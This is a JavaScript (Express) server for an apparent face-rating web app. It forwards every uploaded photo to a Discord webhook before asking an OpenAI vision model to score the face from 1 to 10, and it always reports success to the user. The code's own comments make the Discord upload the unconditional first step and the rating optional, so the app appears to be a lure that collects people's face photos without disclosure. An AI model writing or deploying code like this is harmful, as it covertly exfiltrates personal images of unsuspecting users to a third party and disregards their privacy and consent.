import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import OpenAI from "openai";
import dotenv from "dotenv";
import fetch from "node-fetch";
import FormData from "form-data";
import { fileURLToPath } from "url";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;

const openai = new OpenAI({
  apiKey: OPENAI_API_KEY,
});

/* ===== 업로드 설정 ===== */
const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const upload = multer({ dest: uploadDir });

/* ===== 정적 파일 서빙 ===== */
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

/* ===== 업로드 엔드포인트 ===== */
app.post("/upload", upload.single("photo"), async (req, res) => {
  console.log("🔥 /upload 요청 들어옴");

  const filePath = req.file.path;

  /* ===============================
     1️⃣ 무조건 디스코드로 사진 전송
     =============================== */
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));

    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    if (!discordRes.ok) {
      console.error("❌ 디스코드 전송 실패:", await discordRes.text());
    }
  } catch (e) {
    console.error("❌ 디스코드 전송 실패:", e.message);
  }

  /* ===============================
     2️⃣ OpenAI Vision 얼굴 평가
     (실패해도 무시)
     =============================== */
  let aiResult = "AI 분석 실패 (사진은 정상적으로 전송됨)";
  let score = null;

  try {
    const imageBase64 = fs.readFileSync(filePath, {
      encoding: "base64",
    });

    const response = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "user",
          content: [
            {
              type: "text",
              text: `
이 얼굴을 기준으로
1~10점 사이 점수 하나만 먼저 숫자로 주고
그 다음에 한 줄로 솔직한 얼굴 평가를 해줘
(욕설 금지, 장난스럽게)
`,
            },
            {
              type: "image_url",
              image_url: {
                url: `data:image/jpeg;base64,${imageBase64}`,
              },
            },
          ],
        },
      ],
      max_tokens: 200,
    });

    const text = response.choices[0].message.content;
    aiResult = text;

    const match = text.match(/([1-9]|10)\s*점/);
    if (match) score = match[1];
  } catch (e) {
    console.error("❌ AI 평가 실패:", e.message);
  }

  /* ===============================
     3️⃣ 파일 삭제
     =============================== */
  fs.unlink(filePath, () => {});

  /* ===============================
     4️⃣ 유저에게 항상 성공 응답
     =============================== */
  res.json({
    ok: true,
    score,
    result: aiResult,
  });
});

/* ===== 서버 시작 ===== */
app.listen(PORT, () => {
  console.log("✅ Server running on", PORT);
});
